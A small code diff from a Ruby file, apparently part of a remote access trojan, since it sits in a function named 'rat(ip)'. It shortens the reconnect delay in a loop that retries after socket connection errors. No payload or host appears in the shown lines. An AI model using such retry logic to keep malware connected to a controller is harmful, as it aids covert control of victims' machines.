@@ -111,7 +111,7 @@ def rat(ip)
     end
     # SocketError, Errno::ECONNREFUSED, Errno::ECONNRESET
   rescue
-    sleep 2
+    sleep 1
     retry
   end
 
